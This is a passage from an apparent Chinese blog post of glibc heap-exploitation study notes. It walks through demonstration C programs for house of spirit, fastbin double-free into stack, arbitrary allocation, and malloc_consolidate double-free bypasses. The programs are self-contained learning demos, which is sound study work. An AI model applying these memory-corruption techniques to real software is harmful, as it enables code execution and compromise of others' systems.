to 0x40 so malloc will think it is a valid chunk.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"现在将堆块的大小（%p）设置为 0x40，以便 malloc 认为它是一个有效的堆块。\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size // 这是大小</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"下一个伪造区域的 chunk.size 必须合理。即 &gt; 2*SIZE_SZ（x64 上 &gt; 16）&amp;&amp; &lt; av-&gt;system_mem（主区域默认 &lt; 128kb）以通过 nextsize 完整性检查。无需 fastbin 大小。\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Set the size of the chunk (%p) to 0x1234 so freeing the first chunk can succeed.\n"</span>, &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"将堆块的大小（%p）设置为 0x1234，以便释放第一个堆块可以成功。\n"</span>, &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize // 下一个大小</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\nStep 3: Free the first fake chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n步骤 3：释放第一个伪造堆块"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Note that the address of the fake chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"请注意，伪造堆块的地址必须是 16 字节对齐的。\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *victim = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\nStep 4: Take out the fake chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n步骤 4：取出伪造堆块"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the next calloc will return our fake chunk at %p!\n"</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"现在下一个 calloc 将返回我们的伪造堆块在 %p！\n"</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc can do the trick as well, you just need to do it for 8 times."</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc 也可以达到目的，你只需要做 8 次。\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *allocated = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p, fake chunk: %p\n"</span>, allocated, victim);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(0x30)：%p，伪造堆块：%p\n"</span>, allocated, victim);</span><br><span class="line"></span><br><span class="line">assert(allocated == victim);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>栈上还未进行构造的fake_chunks<br><img src="/2024/07/15/heap-study/house_of_spirit_1.png"><br>我们将要将fake_chunks进行以下构造而绕过glibc的检查<br><img src="/2024/07/15/heap-study/house_of_spirit_2.png"><br>下面是构造后的fake_chunks<br><img src="/2024/07/15/heap-study/house_of_spirit_3.png"><br><img src="/2024/07/15/heap-study/house_of_spirit_4.png">  </p><p>构造 chunk 的时候要注意绕过一些检查：</p><p>后面那三个特殊的标志位前两个必须都为 0，构造 size 的时候直接 0x*0就可以了，然后大小要注意符合 fastbin 的大小，next chunk 的大小也要注意，必须大于 2*SIZE_SZ，小于 av-&gt;system_mem.64位下：16&lt; next chunk 的 size &lt; 128kb。</p><h2 id="fastbin-dup-into-stack-Alloc-to-Stack"><a href="#fastbin-dup-into-stack-Alloc-to-Stack" class="headerlink" title="fastbin_dup_into_stack(Alloc to Stack)"></a>fastbin_dup_into_stack(Alloc to Stack)</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">               <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">        <span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">                <span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">                <span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">                <span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">                <span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">        stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">        *d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在UAF的基础上，修改chunk1的fd指针指向stack_var前的0x20的位置</p><p><img src="/2024/07/15/heap-study/fastbin_dup_into_stack_1.png"></p><p><img src="/2024/07/15/heap-study/fastbin_dup_into_stack_2.png"></p><p>此时main_arena指向了栈上，再malloc一次就分配到了栈上</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><blockquote><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    <span class="type">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk1 = <span class="number">0x7f9b4c45baf5</span> - <span class="number">0x8</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="fd指针得出"><a href="#fd指针得出" class="headerlink" title="fd指针得出"></a>fd指针得出</h3><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE<span class="emphasis">_SZ</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=0, size=0x10]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=1, size=0x20]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=2, size=0x30]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=3, size=0x40]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=4, size=0x50]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=5, size=0x60]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=6, size=0x70]</span></span><br></pre></td></tr></tbody></table></figure><h4 id="人工"><a href="#人工" class="headerlink" title="人工"></a>人工</h4><p><img src="/2024/07/15/heap-study/arbitrary_alloc_1.png"></p><p>可以看到0x7f9558141af5处能错位出一个0x000000000000007f的size域，可以在此构造一个0x70的fake_chunk，需要malloc 0x60的chunk</p><h4 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h4><p><img src="/2024/07/15/heap-study/arbitrary_alloc_2.png"></p><p>利用pwndbg的find_fake_fast指令第一个参数是想要overlap的地址，第二个参数是大小(要在fastbin的范围内)</p><h1 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h1><h2 id="绕过tcache对double-free的检查（latest）"><a href="#绕过tcache对double-free的检查（latest）" class="headerlink" title="绕过tcache对double free的检查（latest）"></a>绕过tcache对double free的检查（latest）</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication in the tcache.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It would also allow us to perform tcache poisoning.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Lets fill up the tcache to force fastbin usage...\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line"><span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// void* ppoison = malloc(0x400);</span></span><br><span class="line"><span class="comment">// ^ We would have to allocate this to be able to do tcache poison later, since we need at least 2 chunks in a bin to do it.</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"><span class="comment">// Using calloc here doesn't take from the tcache since calloc calls _int_malloc (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3679) </span></span><br><span class="line"><span class="comment">// and taking from the tcache is handled in __libc_malloc. If we used malloc(0x40) the chunk would get taken from the tcache.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocate another chunk of the same size p1=%p \n"</span>, p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Freeing p1 will add it to the fastbin.\n\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// free(ppoison);</span></span><br><span class="line"><span class="comment">// We can now free this chunk to put it in the tcache bin for the poison.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"To trigger malloc_consolidate we need to allocate a chunk with large chunk size (&gt;= 0x400)\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"which corresponds to request size &gt;= 0x3f0. We will request 0x400 bytes, which will gives us\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a tcache-sized chunk with chunk size 0x410. p3=%p\n"</span>, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nmalloc_consolidate will merge the fast chunk p1 with top.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n"</span>);</span><br><span class="line"></span><br><span class="line">assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(p1); <span class="comment">// vulnerability</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"So p1 is double freed, and p3 hasn't been freed although it now points to a free chunk.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We have thus achieved UAF on tcache!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// *(long long*)p3 = target;</span></span><br><span class="line"><span class="comment">// We can use the UAF here to perform tcache poison.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We will request a chunk of size 0x400, this will give us the 0x410 chunk thats currently in\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"the tcache bin. p3 and p1 will still be pointing to it.\n"</span>);</span><br><span class="line"><span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">assert(p4 == p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We now have two pointers (p3 and p4) that haven't been directly freed\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"and both point to the same tcache sized chunk. p3=%p p4=%p\n"</span>, p3, p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We have achieved duplication!\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Note: This duplication would have also worked with a larger chunk size, the chunks would\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"have behaved the same, just being taken from the top instead of from the tcache bin."</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>填充完tcache后calloc一个相同大小的chunk，free它后将会被放入fastbin中<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_1.png"><br>随后malloc一个0x400的chunk触发malloc_consolidate此时p1 = p3<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_2.png"><br>此时可以实现对p1的重释放</p><p>此时我们再malloc一个0x400的chunk就可以实现对tcache上的UAF(p3 = p4)<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_3.png"><br><strong>注意：这种复制也可以用于更大的块大小，块的行为相同，只是从 top 而不是从 tcache bin 中取出。</strong></p><h2 id="绕过fastbin-对-double-free-的检查（glibc2-23）"><a href="#绕过fastbin-对-double-free-的检查（glibc2-23）" class="headerlink" title="绕过fastbin 对 double free 的检查（glibc2.23）"></a>绕过fastbin 对 double free 的检查（glibc2.23）</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">  <span class="type">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) {</span><br><span class="line">      ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">      <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//void* p1 = calloc(1,0x10);</span></span><br><span class="line">  <span class="type">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(p1, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">  <span class="comment">//void* p2 = calloc(1,0x10);</span></span><br><span class="line">  <span class="type">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(p2, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"申请两个 fastbin 范围内的 chunk: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"先 free p1\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"因为 malloc_consolidate(), p1 会被放到 unsorted bin 中\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free\n"</span>);</span><br><span class="line">  <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(p4, <span class="string">"CCCCCCC"</span>);</span><br><span class="line">  <span class="type">void</span>* p5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(p5, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: %p %p\n"</span>, p4, p5);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>一开始calloc()两个0x10的chunk<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_4.png"><br>先释放掉p1放到fastbin中<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_5.png"><br>此时malloc一个 large chunk 即：void *p3 = malloc(0x400); 触发malloc_consolidate将fastbin中的chunk放入到smallbin或者unstoredbin<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_6.png"><br>此时p1就不在fastbin中链表的头部了，就可以被再次free<br>那么p1就既在fastbin和smallbin中了<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_7.png"><br>现在再进行两次malloc那么就都分配到p1<br>此时就实现了UAF  </p><h1 id="house-of-force-glibc2-31"><a href="#house-of-force-glibc2-31" class="headerlink" title="house_of_force(glibc2.31)"></a>house_of_force(glibc2.31)</h1><p><img src="/2024/07/15/heap-study/house_of_force.png"></p><h1 id="house-of-lore-glibc2-31"><a href="#house-of-lore-glibc2-31" class="headerlink" title="house_of_lore(glibc2.31)"></a>house_of_lore(glibc2.31)</h1><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">House of Lore 的作用主要是利用 malloc 实现中的逻辑漏洞，在堆溢出攻击中实现任意内存写入。攻击者通过精心构造的堆块伪造和未检查的合并操作，可以欺骗 malloc 认为一个伪造的块是合法的堆块，从而进行任意内存写入。这种攻击技术允许攻击者修改全局变量、函数指针等关键数据，甚至可能实现远程代码执行，造成严重安全问题。</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 